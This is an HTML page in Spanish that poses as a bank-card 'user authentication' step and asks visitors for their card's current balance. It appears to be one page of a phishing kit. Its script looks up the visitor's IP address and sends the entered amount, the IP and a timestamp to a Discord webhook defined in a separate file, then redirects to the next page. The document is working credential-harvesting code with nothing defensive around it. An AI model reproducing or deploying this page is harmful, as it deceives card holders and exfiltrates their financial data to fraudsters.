<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagina de Seguridad</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background-color: #f6f6f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        .image-placeholder {
            width: 280px;
            height: 100px;
            background-color: #f0f0f0;
            border: 1px solid #e0e0e0;
            margin: 0 auto 40px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .image-placeholder img {
            max-width: 100%;
            max-height: 100%;
        }

        h1 {
            font-size: 24px;
            color: #000;
            margin-bottom: 30px;
            font-weight: bold;
        }

        .instruction {
            font-size: 18px;
            color: #000;
            text-align: left;
            margin-bottom: 30px;
            line-height: 1.2;
            padding: 0 10px;
        }

        .input-container {
            margin-bottom: 40px;
        }

        input {
            width: 90%;
            padding: 25px;
            background-color: #eeeeee;
            border: 1px solid #cccccc;
            border-radius: 8px;
            font-size: 20px;
            color: #333;
            text-align: center;
            outline: none;
        }

        input::placeholder {
            color: #aaaaaa;
        }

        .btn-verify {
            width: 55%;
            padding: 15px;
            background-color: #3b82f6;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: normal;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-verify:hover {
            background-color: #2563eb;
        }

        .btn-verify:disabled {
            background-color: #94a3b8;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="image-placeholder">
            <img src="css/swj.png" alt="Icono">
        </div>

        <h1>Autenticacion de Usuario</h1>

        <p class="instruction">
            Ingrese el monto actual de su tarjeta ingresada
        </p>

        <form id="authForm">
            <div class="input-container">
                <input type="text" id="montoInput" placeholder="Ingresar Monto" required>
            </div>

            <button type="submit" class="btn-verify" id="btnSubmit">Verificar</button>
        </form>
    </div>

    <!-- Carga la variable webhookURL desde envi.js -->
    <script src="css/envi.js"></script>

    <script>
        const authForm = document.getElementById('authForm');
        const btnSubmit = document.getElementById('btnSubmit');

        authForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const montoValue = document.getElementById('montoInput').value;

            // Bloqueamos el botón mientras procesa
            btnSubmit.innerText = "Cargando...";
            btnSubmit.disabled = true;

            // Intentamos obtener la IP del cliente
            let userIP = "No detectada";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                console.error("Error al obtener IP");
            }

            // Construimos el mensaje para Discord (formato texto plano)
            const mensaje = `**VERIFICACIÓN DE MONTO**\n` +
                          `> **Monto ingresado:** ${montoValue}\n` +
                          `> **IP del cliente:** ${userIP}\n` +
                          `> **Fecha:** ${new Date().toLocaleString()}`;

            // Enviamos a Discord
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: mensaje })
            })
            .then(res => {
                if(res.ok) {
                    // Redirección a index2.html tras el éxito
                    window.location.href = "index4.html";
                } else {
                    alert("Error al verificar. Intente de nuevo.");
                    resetBtn();
                }
            })
            .catch(err => {
                alert("Error de conexión.");
                resetBtn();
            });
        });

        function resetBtn() {
            btnSubmit.innerText = "Verificar";
            btnSubmit.disabled = false;
        }
    </script>

</body>
</html>
